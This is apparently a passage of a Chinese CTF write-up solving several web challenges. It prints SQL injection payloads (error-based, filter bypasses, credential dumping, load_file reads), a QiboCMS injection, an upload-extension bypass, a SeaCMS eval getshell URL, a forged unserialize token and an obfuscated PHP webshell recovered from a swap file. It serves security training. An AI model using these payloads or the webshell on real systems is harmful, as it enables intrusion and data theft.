</span></span></code></pre></td></tr></table></div></div><p>然后故技重施，由于长度限制只得到一部分 flag，再修改 payload：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&#34;&#39; and updatexml(1,concat(0x7e, mid((select load_file(&#39;/var/www/html/f13g_ls_here.txt&#39;)),30,40),0x7e),1)#&#34;
</span></span></code></pre></td></tr></table></div></div><p>即可得到第二部分。</p><h2 id=再见-cms>再见 CMS</h2><p>根据登录页面页脚可以判断出该 CMS 为齐博 CMS。<a href=https://blog.csdn.net/qq_33020901/article/details/52593063 target=_blank rel="noopener noreffer">漏洞参考</a>，很巧妙地利用了转义进行 SQL 注入。</p><p>根据参考的文章，先注册一个用户，然后去会员中心修改个人信息，可以看到表单中每一项对应什么参数。然后构造 payload：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/member/userinfo.php?job=edit&amp;step=2
</span></span></code></pre></td></tr></table></div></div><p>POST 数据：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>truename=xxxx%0000&amp;Limitword[000]=&amp;email=123456@qq.com&amp;provinceid=,address=(select database()) where uid=3#
</span></span></code></pre></td></tr></table></div></div><p>首先 <code>uid</code> 对应自己账户的 <code>uid</code>，在个人信息处可以在 url 中看到。注入的具体原理参考 “漏洞参考” 文章，注入点是参数 <code>provinceid</code>，注意不是 <code>address</code>。</p><p>这样可以在个人信息页面的 “联系地址” 一栏得到数据库名 <code>blog</code>。接下来爆表名：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>truename=xxxx%0000&amp;Limitword[000]=&amp;email=123456@qq.com&amp;provinceid=,address=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where uid=3#
</span></span></code></pre></td></tr></table></div></div><p>我们关心的是表 <code>admin</code>。爆列名，注意单双引号会被转义所以不能使用，可以用十六进制绕过：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>truename=xxxx%0000&amp;Limitword[000]=&amp;email=123456@qq.com&amp;provinceid=,address=(select group_concat(column_name) from information_schema.columns where table_name=0x61646d696e) where uid=3#
</span></span></code></pre></td></tr></table></div></div><p>爆用户名和密码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>truename=xxxx%0000&amp;Limitword[000]=&amp;email=123456@qq.com&amp;provinceid=,address=(select group_concat(username,0x7e,password) from admin) where uid=3#
</span></span></code></pre></td></tr></table></div></div><p>得到用户名 <code>admin</code>，密码 MD5 <code>2638127c92b79ee7901195382dc08068</code>，普通 MD5 网站解不出来，在 <code>https://hashkiller.co.uk/Cracker</code> 和 <code>http://www.chamd5.org/</code> 上破解出来是 <code>4b10b488e4c8</code>，但是用这个密码登录不了，可能方向错了吧。</p><p>无奈只能扫下目录发现 <code>flag.php</code>，然后利用 SQL 读文件：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>truename=xxxx%0000&amp;Limitword[000]=&amp;email=123456@qq.com&amp;provinceid=,address=(select load_file(0x2f7661722f7777772f68746d6c2f666c61672e706870)) where uid=3#
</span></span></code></pre></td></tr></table></div></div><p>发现联系地址这次变成了空白，F12 得到 <code>flag.php</code> 源码从而得到 flag。</p><h2 id=sql>SQL</h2><p>过滤了很多关键字，绕过技巧是用 <code>&lt;></code> 来分割：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>id</span><span class=o>=</span><span class=mi>1</span><span class=w> </span><span class=n>o</span><span class=o>&lt;&gt;</span><span class=n>rder</span><span class=w> </span><span class=k>by</span><span class=w> </span><span class=mi>1</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>发现 <code>by 4</code> 的时候无回显但 <code>by 3</code> 的时候有，说明共 3 列。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>id</span><span class=o>=</span><span class=mi>1</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=n>se</span><span class=o>&lt;&gt;</span><span class=n>lect</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>3</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>得到回显 <code>2</code>。接下来正常注入：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>id</span><span class=o>=</span><span class=mi>1</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=n>se</span><span class=o>&lt;&gt;</span><span class=n>lect</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=n>group_concat</span><span class=p>(</span><span class=k>table_name</span><span class=p>),</span><span class=mi>3</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>table_schema</span><span class=o>=</span><span class=k>database</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>-- info, users
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>id</span><span class=o>=</span><span class=mi>1</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=n>se</span><span class=o>&lt;&gt;</span><span class=n>lect</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=n>group_concat</span><span class=p>(</span><span class=k>column_name</span><span class=p>),</span><span class=mi>3</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>columns</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=k>table_name</span><span class=o>=</span><span class=s1>&#39;info&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>-- id,title,flAg_T5ZNdrm
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>id</span><span class=o>=</span><span class=mi>1</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=n>se</span><span class=o>&lt;&gt;</span><span class=n>lect</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=n>flAg_T5ZNdrm</span><span class=p>,</span><span class=mi>3</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>info</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>-- flag{...}
</span></span></span></code></pre></td></tr></table></div></div><h2 id=sqli>SQLi</h2><p>F12 发现 <code>login.php?id=1</code>，但是这里好像注入不了。</p><p>回到前页，发现页面是由 <code>index.php</code> 302 跳转来的，因此检查一下对于 <code>index.php</code> 的请求的返回头，发现了特殊字段 <code>page</code>，得到真正的登陆页面 <code>l0gin.php?id=1</code>。</p><p>这个 <code>id</code> 可以注入，但是存在逗号截断，因此需要在没有逗号的情况下注入，这里很容易想到 <code>join</code>。先 <code>order by</code> 注入，得到列数为 2。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>id=1&#39; order by 3%23
</span></span></code></pre></td></tr></table></div></div><p>尝试一下 <code>join</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>id=1&#39;union select * from (select 1)a join (select 2)b%23
</span></span></code></pre></td></tr></table></div></div><p>发现还是正常返回 <code>1,flag</code>，因为网页上限制了只能显示一条记录，而 <code>id=1</code> 的查询是成功的，因此后面我们 <code>union</code> 的结果没有回显出来。因此只需要让 <code>id=3</code> 使得查询不到 <code>username</code> 即可。</p><p>最后正常注入：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>id=3&#39;union select * from (select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema=database())b%23
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>id=3&#39;union select * from (select 1)a join (select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)b%23
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>id=3&#39;union select * from (select 1)a join (select flag_9c861b688330 from users)b%23
</span></span></code></pre></td></tr></table></div></div><h2 id=123>123</h2><p>F12 得到 <code>user.php</code> 和用户默认密码，下载 <code>user.php.bak</code>，打开得到一堆用户名。Intruder 用 <code>BatteringRam</code> 模式爆破用户名密码，登陆后 F12 得到：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=c>&lt;!-- 存在漏洞需要去掉  --&gt;</span>
</span></span><span class=line><span class=cl><span class=c>&lt;!-- &lt;form action=&#34;&#34;method=&#34;POST&#34;enctype=&#34;multipart/form-data&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=c>    &lt;input type=&#34;file&#34;name=&#34;file&#34;/&gt;
</span></span></span><span class=line><span class=cl><span class=c>    &lt;input type=&#34;submit&#34;name=&#34;submit&#34;value=&#34; 上传 &#34;/&gt;
</span></span></span><span class=line><span class=cl><span class=c>&lt;/form&gt; --&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>这里猜测是文件上传漏洞。恢复前端代码后随便选个文件上传，发现只能传图片文件，因此修改 <code>Content-Type</code> 和文件内容。<code>Content-Type</code> 设置为 <code>image/png</code>，文件内容中写入 PNG 文件头 <code>PNG</code>。然后将文件名改为 <code>1.png.php</code>，但是提示 <code>文件名不能包含 php</code>。</p><p>因此尝试 <code>1.png.pht</code> 绕过，得到页面 <code>view.php</code>。只有一个提示 <code>file?</code>，尝试传入 GET 参数 <code>file=flag</code>，得到提示 <code>filter 'flag'</code>，于是双写绕过。</p><h2 id=test>Test</h2><p>海洋 CMS 很老的漏洞，<a href=http://0day5.com/archives/4180/ target=_blank rel="noopener noreffer">漏洞详情</a>。</p><p>直接蚁剑连接 <code>/search.php?searchtype=5&tid=&area=eval($_POST[1])</code> 来 getshell。但是没有找到 flag。</p><p>到 <code>/var/www/html/data/common.inc.php</code> 找到数据库配置：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=c1>// 数据库连接信息
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$cfg_dbhost</span> <span class=o>=</span> <span class=s1>&#39;127.0.0.1&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$cfg_dbname</span> <span class=o>=</span> <span class=s1>&#39;seacms&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$cfg_dbuser</span> <span class=o>=</span> <span class=s1>&#39;sea_user&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$cfg_dbpwd</span> <span class=o>=</span> <span class=s1>&#39;46e06533407e&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$cfg_dbprefix</span> <span class=o>=</span> <span class=s1>&#39;sea_&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$cfg_db_language</span> <span class=o>=</span> <span class=s1>&#39;utf8&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>在蚁剑中选择 <code>数据操作</code>，然后输入上面的配置信息，可以在 <code>seacms</code> 数据库的 <code>flag_140ad2e0d8cb</code> 表中执行 SQL 语句得到 flag。</p><h2 id=login>Login</h2><p>F12 中提示账户密码都为 <code>test1</code>，登录后在响应头中发现 <code>show</code> 字段，把 0 在请求头改成 1 试试，发现注释中返回了源码。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>    <span class=k>include</span> <span class=s1>&#39;common.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$requset</span> <span class=o>=</span> <span class=nx>array_merge</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>,</span> <span class=nv>$_POST</span><span class=p>,</span> <span class=nv>$_SESSION</span><span class=p>,</span> <span class=nv>$_COOKIE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>class</span> <span class=nc>db</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>public</span> <span class=nv>$where</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>where</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>select</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>where</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>function</span> <span class=nf>select</span><span class=p>(</span><span class=nv>$where</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$sql</span> <span class=o>=</span> <span class=nx>mysql_query</span><span class=p>(</span><span class=s1>&#39;select * from user where&#39;</span><span class=o>.</span><span class=nv>$where</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=o>@</span><span class=nx>mysql_fetch_array</span><span class=p>(</span><span class=nv>$sql</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$requset</span><span class=p>[</span><span class=s1>&#39;token&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$login</span> <span class=o>=</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nx>gzuncompress</span><span class=p>(</span><span class=nx>base64_decode</span><span class=p>(</span><span class=nv>$requset</span><span class=p>[</span><span class=s1>&#39;token&#39;</span><span class=p>])));</span>
</span></span><span class=line><span class=cl>        <span class=nv>$db</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>db</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=nv>$row</span> <span class=o>=</span> <span class=nv>$db</span><span class=o>-&gt;</span><span class=na>select</span><span class=p>(</span><span class=s1>&#39;user=\&#39;&#39;</span><span class=o>.</span><span class=nx>mysql_real_escape_string</span><span class=p>(</span><span class=nv>$login</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>])</span><span class=o>.</span><span class=s1>&#39;\&#39;&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$login</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>]</span> <span class=o>===</span><span class=s1>&#39;ichunqiu&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=nv>$flag</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span><span class=k>else</span> <span class=k>if</span><span class=p>(</span><span class=nv>$row</span><span class=p>[</span><span class=s1>&#39;pass&#39;</span><span class=p>]</span> <span class=o>!==</span> <span class=nv>$login</span><span class=p>[</span><span class=s1>&#39;pass&#39;</span><span class=p>]){</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s1>&#39;unserialize injection!!&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;(╯‵□′)╯︵┴─┴ &#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>header</span><span class=p>(</span><span class=s1>&#39;Location: index.php?error=1&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>这里需要以 <code>ichunqiu</code> 登录，关键就在于那个反序列化的过程。而且，<code>array_merge</code> 合并时，遇到相同的键取最后的那个值。</p><p>写个脚本生成需要的 <code>token</code>，然后放在 cookie 里发送就好了。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>  <span class=nv>$a</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;user&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;ichunqiu&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>echo</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nx>gzcompress</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>)));</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><h2 id=backdoor>Backdoor</h2><p>扫目录发现 <code>.git</code> 泄露。上 GitHack 把 <code>.git</code> 下载下来，然后发现需要回退。</p><p>值得记录的是 GitHack 好像没能把 <code>.git</code> 下下来，只能下载所有文件，因此我使用了 <code>dvcs ripper</code> 这个工具：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>./rip-git.pl -v -u http://1355bb65468a451b9487c15dba117690cff7627b879e42f2.
</span></span><span class=line><span class=cl>changame.ichunqiu.com/Challenges/.git/
</span></span></code></pre></td></tr></table></div></div><p>访问 <code>/Challenges/.git/logs/HEAD</code> 可以查看提交记录，或者也可以 <code>git log</code> 查看。随后回退到之前的版本：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>git reset --hard 12c6ddf4af0a5542c1cf6a9ab19b4231c1fd9a88
</span></span><span class=line><span class=cl>cat flag.php
</span></span></code></pre></td></tr></table></div></div><p>这时可以看到，<code>flag.php</code> 内容变为：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;flag{true_flag_is_in_the_b4ckdo0r.php}&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>那么我们继续访问 <code>b4ckdo0r.php</code>，提示要找出其源码。这种一般都存在备份文件里，例如 <code>vim</code> 中的 <code>.swo</code> 和 <code>.swp</code>，逐一尝试得备份文件 <code>.b4ckdo0r.php.swp</code>，用 <code>vim -r</code> 恢复：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;can you find the source code of me?&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=sd>/**
</span></span></span><span class=line><span class=cl><span class=sd> * Signature For Report
</span></span></span><span class=line><span class=cl><span class=sd> */</span><span class=nv>$h</span><span class=o>=</span><span class=s1>&#39;_)m/&#34;,&#34;/-/)m&#34;),)marray()m&#34;/&#34;,&#34;+&#34;)m),$)mss($s[$i)m],0,$e))))m)m,$k)));$o=ob)m_get_c)monte)m)mnts)m();ob_end_clean)&#39;</span><span class=p>;</span><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm> */</span><span class=nv>$H</span><span class=o>=</span><span class=s1>&#39;m();$d=ba)mse64)m_encode)m(x(gzc)mompres)ms($o),)m$)mk));print(&#34;&lt;)m$k&gt;$d&lt;)m/)m$k&gt;)m&#34;);@sessio)mn_d)mestroy();}}}}&#39;</span><span class=p>;</span><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm> */</span><span class=nv>$N</span><span class=o>=</span><span class=s1>&#39;mR;$rr)m=@$r[)m&#34;HTT)mP_RE)mFERER&#34;];$ra)m=)m@$r[&#34;HTTP_AC)mC)mEPT_LANG)mUAGE)m&#34;)m];if($rr)m&amp;&amp;$ra){)m$u=parse_u)mrl($rr);p&#39;</span><span class=p>;</span><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm> */</span><span class=nv>$u</span><span class=o>=</span><span class=s1>&#39;$e){)m$k=$)mkh.$kf;ob)m_start();)m@eva)ml(@gzunco)mmpr)mess(@x(@)mbase6)m4_deco)mde(p)m)mreg_re)mplace(array(&#34;/&#39;</span><span class=p>;</span><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm> */</span><span class=nv>$f</span><span class=o>=</span><span class=s1>&#39;$i&lt;$)ml;)m){)mfo)mr($j)m=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j)m++,$i+)m+){$)mo.=$t{$i)m}^$)mk{$j};}}r)meturn )m$o;}$r)m=$_SERVE)&#39;</span><span class=p>;</span><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm> */</span><span class=nv>$O</span><span class=o>=</span><span class=s1>&#39;[$i]=&#34;&#34;;$p)m=$)m)mss($p,3)m);}if(ar)mray_)mkey_exists)m()m$i,$s)){$)ms[$i].=$p)m;)m$e=s)mtrpos)m($s[$i],$f);)mif(&#39;</span><span class=p>;</span><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm> */</span><span class=nv>$w</span><span class=o>=</span><span class=s1>&#39;)m));)m$p=&#34;&#34;;fo)mr($z=1;)m$z&lt;c)mount()m$m[1]);$)mz++)m)m)$p.=$q[$m[)m)m2][$z]];if(str)mpo)ms($p,$h))m===0){$s)m&#39;</span><span class=p>;</span><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm> */</span><span class=nv>$P</span><span class=o>=</span><span class=s1>&#39;trt)molower&#34;;$)mi=$m[1][0)m)m].$m[1][1])m;$h=strtolower()msubstr(m)md5($)mi.$kh)m),0,)m3));$f=$s)ml(substr()m)mmd5($i.$kf),0,3&#39;</span><span class=p>;</span><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm> */</span><span class=nv>$i</span><span class=o>=</span><span class=s1>&#39;)marse_)mstr)m($u[&#34;q)muery&#34;],$)m)mq);$q=array)m_values()m$q);pre)mg_matc)mh_all()m&#34;/([\\w)m])m)[\\w-)m]+(?:;q=0.)&#39;</span><span class=p>;</span><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm> */</span><span class=nv>$x</span><span class=o>=</span><span class=s1>&#39;m([\\d)m]))?,?/&#34;,)m$ra,$m))m;if($q)m&amp;&amp;$)mm))m)m{@session_start();$)ms=&amp;$_S)mESSI)m)mON;$)mss=&#34;sub)mstr&#34;;strtolower=&#34;s)m&#39;</span><span class=p>;</span><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm> */</span><span class=nv>$y</span><span class=o>=</span><span class=nx>str_replace</span><span class=p>(</span><span class=s1>&#39;b&#39;</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>,</span><span class=s1>&#39;crbebbabte_funcbbtion&#39;</span><span class=p>);</span><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm> */</span><span class=nv>$c</span><span class=o>=</span><span class=s1>&#39;$kh=&#34;4f7)m)mf&#34;;$kf=&#34;2)m)m8d7&#34;;funct)mion x($t)m,$k){$)m)mc=strlen($k);$l=st)mrlen)m($t);)m)m$o=&#34;&#34;;for()m$i=0;&#39;</span><span class=p>;</span><span class=cm>/*
